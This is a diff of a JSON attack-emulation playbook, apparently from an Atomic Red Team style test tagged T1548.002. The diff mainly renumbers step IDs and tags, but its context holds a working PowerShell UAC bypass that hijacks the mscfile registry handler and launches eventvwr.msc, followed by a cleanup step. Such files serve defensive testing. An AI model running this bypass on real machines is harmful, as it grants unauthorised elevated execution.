@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "0c5f97fb-013b-46c6-a1da-a09de5400d17",
+      "id": "9734eecd-22ab-4688-84d7-de042d1dcaab",
       "type": "execute-command",
       "data": {
         "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "86bd5de9-b2bf-43fe-958e-ab892f457b32",
+      "id": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "0c5f97fb-013b-46c6-a1da-a09de5400d17",
+      "s": "9734eecd-22ab-4688-84d7-de042d1dcaab",
       "p": "on-success",
-      "o": "86bd5de9-b2bf-43fe-958e-ab892f457b32"
+      "o": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7"
     },
     {
-      "s": "0c5f97fb-013b-46c6-a1da-a09de5400d17",
+      "s": "9734eecd-22ab-4688-84d7-de042d1dcaab",
       "p": "on-failure",
-      "o": "86bd5de9-b2bf-43fe-958e-ab892f457b32"
+      "o": "9146fc4e-0c1b-4fbc-9555-48dcc79904f7"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
     {
